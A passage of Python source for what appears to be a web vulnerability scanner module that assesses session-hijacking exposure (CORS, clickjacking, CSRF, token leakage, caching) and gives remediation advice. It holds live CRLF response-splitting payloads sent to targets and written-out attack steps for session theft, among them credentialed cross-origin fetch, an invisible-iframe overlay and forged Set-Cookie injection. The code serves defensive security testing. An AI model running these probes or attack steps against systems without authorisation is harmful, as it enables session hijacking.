                        },
                        cookie_name  = None,
                        attack_steps = [
                            "Host attacker page at any origin.",
                            f"fetch('{url}/api/profile', {{credentials: 'include'}})",
                            "Response includes authenticated user data — CORS allows it.",
                            "Exfiltrate or escalate from attacker origin.",
                        ],
                        notes = "CORS + credentials=true with wildcard/unvalidated origin — full session theft from any cross-origin page.",
                    ))

                # Clickjacking surface
                if ftype == "missing_security_header" and f.get("header") == "X-Frame-Options":
                    findings.append(HijackFinding(
                        finding_id   = str(uuid.uuid4()),
                        technique    = HijackTechnique.CLICKJACKING_SESSION_RIDE,
                        severity     = FindingSeverity.MEDIUM,
                        status       = FindingStatus.CONFIRMED,
                        target_url   = url,
                        evidence     = {"header_finding": f},
                        cookie_name  = None,
                        attack_steps = [
                            f"Embed target in iframe: <iframe src='{url}' style='opacity:0.1'>",
                            "Overlay attacker UI over invisible iframe.",
                            "Victim clicks — triggers actions on target site in their session.",
                        ],
                        notes = "X-Frame-Options absent — page is frameable. Clickjacking rides existing session without stealing the cookie.",
                    ))

        # CSRF token absent in login forms
        for page in scan_results.get("email_enumeration", {}).get("login_pages", []):
            url      = page.get("url", "")
            has_csrf = page.get("csrf_token") is not None

            if not has_csrf and url:
                # check if any session cookie exists for this target
                parsed = urlparse(url)
                matching = [
                    c for host_url, cks in static_cookies.items()
                    for c in cks
                    if urlparse(host_url).netloc == parsed.netloc and c.is_session
                ]
                if matching:
                    findings.append(HijackFinding(
                        finding_id   = str(uuid.uuid4()),
                        technique    = HijackTechnique.CSRF_TOKEN_ABSENT,
                        severity     = FindingSeverity.MEDIUM,
                        status       = FindingStatus.CONFIRMED,
                        target_url   = url,
                        evidence     = {
                            "login_page":        url,
                            "csrf_token_found":  False,
                            "session_cookies":   [c.name for c in matching],
                        },
                        cookie_name  = None,
                        attack_steps = [
                            "Host malicious page on external domain.",
                            f"Auto-POST to {url} with attacker credentials or state-change payload.",
                            "Victim's browser sends session cookie — no CSRF token to block it.",
                        ],
                        notes = "Login form has no CSRF token and session cookies exist — CSRF viable.",
                    ))

        return findings


class _TokenLeakAnalyzer:
    """
    Reads scan_results for URL/referrer token exposure.
    Sources:
      - header_analysis raw_headers_sample — Referer headers
      - ssl_scan certificate_transparency logs (URL paths sometimes indexed)
      - subdomains list — URL patterns with token-looking query params
    """

    _TOKEN_QP_RE = re.compile(
        r'(?:token|session|sid|auth|jwt|key|access_token|id_token|api_key)'
        r'=([A-Za-z0-9._\-]{16,})',
        re.I,
    )

    def analyze(
        self,
        scan_results: Dict[str, Any],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []

        for url, td in scan_results.get("header_analysis", {}).get("targets", {}).items():
            raw = td.get("raw_headers_sample", {})
            for hdr_name, hdr_val in raw.items():
                if hdr_name.lower() == "referer" and isinstance(hdr_val, str):
                    for m in self._TOKEN_QP_RE.finditer(hdr_val):
                        findings.append(HijackFinding(
                            finding_id   = str(uuid.uuid4()),
                            technique    = HijackTechnique.TOKEN_IN_REFERRER,
                            severity     = FindingSeverity.HIGH,
                            status       = FindingStatus.CONFIRMED,
                            target_url   = url,
                            evidence     = {
                                "header":        "Referer",
                                "url":           hdr_val[:200],
                                "token_param":   m.group(0)[:80],
                                "token_preview": m.group(1)[:20] + "...",
                            },
                            cookie_name  = None,
                            attack_steps = [
                                "Any third-party resource loaded on the target page (analytics, CDN, fonts) "
                                "receives the full Referer URL including the session token.",
                                "Third-party logs the token.",
                                "Exfiltrate from third-party or MITM the outbound request.",
                            ],
                            notes = f"Session/auth token found in Referer header sent to {url}.",
                        ))

        # check subdomain URLs for token-in-URL patterns
        for sub in scan_results.get("subdomains", []):
            sub_url = sub.get("url") or f"https://{sub.get('subdomain', '')}"
            if self._TOKEN_QP_RE.search(sub_url):
                findings.append(HijackFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = HijackTechnique.TOKEN_IN_URL,
                    severity     = FindingSeverity.HIGH,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = sub_url,
                    evidence     = {"url": sub_url[:200]},
                    cookie_name  = None,
                    attack_steps = [
                        "Token embedded in URL is logged by: server access logs, proxies, CDN, browser history.",
                        "Any redirect from this URL leaks the token in the Referer header.",
                        "Extract from any of the above log sources.",
                    ],
                    notes = "Session/auth token visible in URL — exposure in logs, history, Referer.",
                ))

        return findings


class _CacheableSessionAnalyzer:
    """
    Checks whether authenticated/session-carrying responses have
    permissive Cache-Control headers. A cacheable session response
    can be read from shared proxy cache by a second requester.
    """

    _BAD_CACHE_VALUES = frozenset({
        "public", "s-maxage", "max-age",
    })
    _GOOD_CACHE_VALUES = frozenset({
        "no-store", "private", "no-cache",
    })

    def analyze(
        self,
        scan_results: Dict[str, Any],
        static_cookies: Dict[str, List[ParsedCookie]],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []

        for url, td in scan_results.get("header_analysis", {}).get("targets", {}).items():
            if not td.get("reachable", True):
                continue
            if url not in static_cookies:
                continue   # no session cookie on this target — skip

            raw = td.get("raw_headers_sample", {})
            cc  = ""
            for k, v in raw.items():
                if k.lower() == "cache-control":
                    cc = v.lower()
                    break

            if not cc:
                # missing Cache-Control on a session-carrying endpoint
                findings.append(HijackFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = HijackTechnique.CACHE_SENSITIVE_RESPONSE,
                    severity     = FindingSeverity.MEDIUM,
                    status       = FindingStatus.LIKELY,
                    target_url   = url,
                    evidence     = {
                        "cache_control":    None,
                        "session_cookies":  [c.name for c in static_cookies[url]],
                        "issue":            "No Cache-Control header on session endpoint",
                    },
                    cookie_name  = None,
                    attack_steps = [
                        "Shared proxy or CDN may cache the response.",
                        "Second user behind same proxy retrieves cached authenticated response.",
                        "Session data visible in cached page.",
                    ],
                    notes = "Cache-Control absent on endpoint serving session cookies — potential shared-cache exposure.",
                ))
                continue

            # Cache-Control present but weak
            has_bad  = any(bv in cc for bv in self._BAD_CACHE_VALUES)
            has_good = any(gv in cc for gv in self._GOOD_CACHE_VALUES)
            if has_bad and not has_good:
                findings.append(HijackFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = HijackTechnique.CACHE_SENSITIVE_RESPONSE,
                    severity     = FindingSeverity.MEDIUM,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = url,
                    evidence     = {
                        "cache_control":   cc,
                        "bad_directives":  [v for v in self._BAD_CACHE_VALUES if v in cc],
                        "session_cookies": [c.name for c in static_cookies[url]],
                    },
                    cookie_name  = None,
                    attack_steps = [
                        f"Response has permissive Cache-Control: {cc}",
                        "Shared reverse proxy / CDN caches this response.",
                        "Attacker requests same URL — receives cached session response.",
                    ],
                    notes = f"Permissive Cache-Control on session-carrying endpoint: '{cc}'.",
                ))

        return findings


class _ResponseSplitProbe:
    """
    HTTP Response Splitting: injects CR+LF into parameters that are
    reflected into Set-Cookie or Location headers.
    Looks for inputs reflected in raw response headers.
    """
    
    _CRLF_PAYLOADS: List[str] = [
        "%0d%0aSet-Cookie:artex_split=1",
        "%0aSet-Cookie:artex_split=1",
        "\r\nSet-Cookie:artex_split=1",
        "%0d%0aContent-Length:0%0d%0a%0d%0a<html>artex",
        "%0d%0aX-Artex-Split:confirmed",
    ]

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(
        self,
        targets:        List[str],
        static_cookies: Dict[str, List[ParsedCookie]],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []
        for url in targets[:5]:
            result = self._probe_one(url)
            if result:
                findings.append(result)
        return findings

    def _probe_one(self, url: str) -> Optional[HijackFinding]:
        for payload in self._CRLF_PAYLOADS:
            probe_url = f"{url}?redirect={payload}"
            resp = self._http.get(probe_url, allow_redirects=False)
            if not resp:
                continue

            # Check if our injected header appeared in the response
            for hdr_name, hdr_val in resp.headers.items():
                if "artex_split" in hdr_name.lower() or "artex_split" in hdr_val.lower():
                    return HijackFinding(
                        finding_id   = str(uuid.uuid4()),
                        technique    = HijackTechnique.RESPONSE_SPLIT,
                        severity     = FindingSeverity.HIGH,
                        status       = FindingStatus.CONFIRMED,
                        target_url   = url,
                        evidence     = {
                            "payload":          payload,
                            "injected_header":  f"{hdr_name}: {hdr_val[:80]}",
                            "probe_url":        probe_url[:200],
                        },
                        cookie_name  = None,
                        attack_steps = [
                            "Inject CR+LF via URL parameter into server response.",
                            "Inject a forged Set-Cookie header: Set-Cookie: session=attacker_value",
                            "Victim visits crafted URL — browser sets attacker-controlled session cookie.",
                            "Attacker replays the known value to hijack session.",
                        ],
                        notes = f"HTTP response splitting confirmed — payload {payload!r} injected into response headers.",
                    )

            # Fallback: check raw response text for injected marker
            if resp.text and "artex_split" in resp.text.lower():
                return HijackFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = HijackTechnique.RESPONSE_SPLIT,
                    severity     = FindingSeverity.MEDIUM,
                    status       = FindingStatus.LIKELY,
                    target_url   = url,
                    evidence     = {
                        "payload":    payload,
                        "reflected":  "artex_split marker found in body",
                        "probe_url":  probe_url[:200],
                    },
                    cookie_name  = None,
                    attack_steps = [
                        "CRLF payload reflected in body — test whether headers are injectable via different parameter or encoding.",
                    ],
                    notes = "CRLF sequence reflected in response body — partial response splitting surface.",
                )

        return None


# ─────────────────────────────────────────────────────────────────────────────
# Scorer
# ─────────────────────────────────────────────────────────────────────────────

class _Scorer:
    _CONF_W = {
        FindingStatus.CONFIRMED: 1.0,
        FindingStatus.LIKELY:    0.65,
        FindingStatus.POSSIBLE:  0.4,
        FindingStatus.NOT_VULN:  0.0,
    }

    def score(self, findings: List[HijackFinding]) -> Tuple[float, str]:
        if not findings:
            return 0.0, "INFO"
        raw = sum(
            f.severity.value * self._CONF_W.get(f.status, 0.5)
            for f in findings
        )
        cap = len(findings) * FindingSeverity.CRITICAL.value
        s   = min(100.0, (raw / cap) * 100) if cap else 0.0
        label = (
            "CRITICAL" if s >= 80 else
            "HIGH"     if s >= 60 else
            "MEDIUM"   if s >= 40 else
            "LOW"      if s >= 20 else
            "INFO"
        )
        return round(s, 2), label


# ─────────────────────────────────────────────────────────────────────────────
# Recommendation builder
# ─────────────────────────────────────────────────────────────────────────────

class _RecBuilder:
    _RECS: Dict[HijackTechnique, str] = {
        HijackTechnique.COOKIE_THEFT_XSS:
            "Add HttpOnly to all session/auth cookies — prevents document.cookie access from XSS.",
        HijackTechnique.COOKIE_THEFT_NETWORK:
            "Add Secure flag; enforce HSTS with preload to prevent SSL-strip intercept.",
        HijackTechnique.COOKIE_FLAG_MISSING:
            "Audit all Set-Cookie headers — enforce Secure, HttpOnly, and SameSite=Strict/Lax.",
        HijackTechnique.COOKIE_SCOPE_WIDE:
            "Restrict cookie domain to the minimum required host — avoid leading dot scoping.",
        HijackTechnique.SESSION_FIXATION:
            "Regenerate session ID on every privilege change, especially post-login (session_regenerate_id(true)).",
        HijackTechnique.SESSION_PREDICTION:
            "Use a CSPRNG for session ID generation (Python secrets, OpenSSL RAND_bytes) — minimum 128 bits.",
        HijackTechnique.SESSION_NO_ROTATION:
            "Issue a fresh session ID immediately after authentication — invalidate the pre-auth ID.",
        HijackTechnique.SESSION_REPLAY_WINDOW:
            "Implement server-side sliding-window expiry and IP/UA binding for high-value sessions.",
        HijackTechnique.SESSION_TIMEOUT_ABSENT:
            "Set explicit max-age or expires on session cookies and enforce server-side idle timeout.",
        HijackTechnique.CSRF_SAMESITE_MISSING:
            "Set SameSite=Strict on all session cookies; fall back to Lax with explicit CSRF tokens.",
        HijackTechnique.CSRF_TOKEN_ABSENT:
            "Add a per-request CSRF token (HMAC-signed, tied to session) to all state-change forms.",
        HijackTechnique.CORS_CREDENTIAL_WILDCARD:
            "Never combine Access-Control-Allow-Credentials: true with * or dynamic unvalidated origins.",
        HijackTechnique.TOKEN_IN_URL:
            "Tokens must travel in headers (Authorization) or POST bodies — never in URL query strings.",
        HijackTechnique.TOKEN_IN_REFERRER:
            "Add Referrer-Policy: no-referrer to all authenticated pages; keep tokens out of URLs.",
        HijackTechnique.CACHE_SENSITIVE_RESPONSE:
            "Set Cache-Control: no-store, private on all authenticated/session-carrying responses.",
        HijackTechnique.SUBDOMAIN_COOKIE_INHERIT:
            "Scope cookies to the specific host, not the parent domain. Treat subdomains as separate trust zones.",
        HijackTechnique.CLICKJACKING_SESSION_RIDE:
            "Add X-Frame-Options: DENY or CSP frame-ancestors 'none' to prevent framing.",
        HijackTechnique.HTTP_SESSION_ON_MIXED:
            "Enforce HTTPS sitewide; never issue session cookies on HTTP origins.",
        HijackTechnique.RESPONSE_SPLIT:
            "Sanitise all user input reflected into HTTP response headers — strip CR (\\r) and LF (\\n).",
    }

    def build(self, findings: List[HijackFinding]) -> List[str]:
        seen:  Set[HijackTechnique] = set()
        recs:  List[str] = []
        order  = sorted(
            findings,
            key=lambda f: (-f.severity.value, f.status != FindingStatus.CONFIRMED),
        )
        for f in order:
            if f.technique not in seen:
                seen.add(f.technique)
                recs.append(f"[{f.severity.name}] {self._RECS.get(f.technique, 'Review and remediate.')}")
        return recs


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

class SessionHijack:
    """
    Drop-in ARTEX module.

    Usage in app.py (run_scan), after header_analysis + email_enumeration:

        from core.session_hijack import SessionHijack

        sh = SessionHijack()
        scan_results[scan_id]['session_hijack'] = sh.run(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        request_delay:  float = 0.4,
        timeout:        float = 8.0,
        on_finding:     Optional[Callable[[HijackFinding], None]] = None,
        skip_slow:      bool  = False,  # skip replay window probe (adds ~15s per target)
    ):
        self._http       = _SessionPool(request_delay=request_delay, timeout=timeout)
        self._on_finding = on_finding
        self._skip_slow  = skip_slow
        self._scorer     = _Scorer()
        self._rec        = _RecBuilder()

    # ── entry point ───────────────────────────────────────────────────────

    def run(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        run_id     = str(uuid.uuid4())
        started_at = datetime.now()
        logger.info("SessionHijack %s starting for %s", run_id, domain)

        # 1. surface read — no network
        reader          = _SurfaceReader()
        targets, static = reader.read(scan_results)
        logger.info("Targets: %d  Static cookies: %d", len(targets), len(static))

        all_findings: List[HijackFinding] = []
        lock = threading.Lock()

        def collect(findings: List[HijackFinding]) -> None:
            with lock:
                all_findings.extend(findings)
                if self._on_finding:
                    for f in findings:
                        try:
                            self._on_finding(f)
                        except Exception:
                            pass

        # 2. static analyses (no network) — run on main thread, fast
        collect(_CookieFlagAuditor().audit(static, scan_results))
        collect(_CsrfSurfaceAnalyzer().analyze(scan_results, static))
        collect(_TokenLeakAnalyzer().analyze(scan_results))
        collect(_CacheableSessionAnalyzer().analyze(scan_results, static))

        # 3. live probes — threaded
        def run_probes() -> None:
            collect(_SessionFixationProbe(self._http).probe(targets, static))
            collect(_SessionEntropyProbe(self._http).probe(targets, static))
            collect(_SessionRotationProbe(self._http).probe(targets, static, scan_results))
            collect(_ResponseSplitProbe(self._http).probe(targets, static))
            if not self._skip_slow:
                collect(_ReplayWindowProbe(self._http).probe(targets, static))

        probe_thread = threading.Thread(target=run_probes)
        probe_thread.start()
        probe_thread.join()

        # 4. score + recs
        score, risk_level = self._scorer.score(all_findings)
        recs              = self._rec.build(all_findings)

        # sort by severity desc, confirmed first
        all_findings.sort(
            key=lambda f: (-f.severity.value, f.status != FindingStatus.CONFIRMED)
        )

        total_cookies   = sum(len(cks) for cks in static.values())
        session_cookies = sum(
            1 for cks in static.values() for c in cks if c.is_session
        )

        finished_at = datetime.now()
        result = HijackResult(
            run_id            = run_id,
            domain            = domain,
            targets_probed    = len(targets),
            findings          = [f.to_dict() for f in all_findings],
            cookies_analyzed  = total_cookies,
            session_cookies   = session_cookies,
            score             = score,
            risk_level        = risk_level,
            techniques_tested = sorted({f.technique.value for f in all_findings}),
            recommendations   = recs,
            started_at        = started_at,
            finished_at       = finished_at,
        )

        logger.info(
            "SessionHijack %s done — score=%.1f risk=%s findings=%d cookies=%d",
            run_id, score, risk_level, len(all_findings), total_cookies,
        )
        return result.to_dict()

    @staticmethod
    def _empty(run_id: str, domain: str, started_at: datetime) -> Dict[str, Any]:
        now = datetime.now()
        return {
            "run_id": run_id, "domain": domain,
            "targets_probed": 0, "findings": [],
            "cookies_analyzed": 0, "session_cookies": 0,
            "score": 0.0, "risk_level": "INFO",
            "techniques_tested": [], "recommendations": [],
            "started_at": started_at.isoformat(),
            "finished_at": now.isoformat(),
            "duration_s": round((now - started_at).total_seconds(), 3),
        }